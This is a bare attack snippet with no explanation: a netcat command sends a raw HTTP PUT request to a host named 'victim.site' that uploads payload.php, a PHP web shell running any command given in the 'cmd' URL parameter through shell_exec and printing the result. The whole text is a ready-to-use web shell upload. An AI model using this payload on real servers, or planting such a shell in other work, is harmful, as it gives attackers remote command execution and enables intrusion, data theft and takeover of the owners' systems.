nc victim.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 136

<?
if (isset($_GET['cmd'])) 
{
  $cmd = $_GET['cmd'];
  echo '<pre>';
  $result = shell_exec($cmd);
  echo $result;
  echo '</pre>';
}
?>
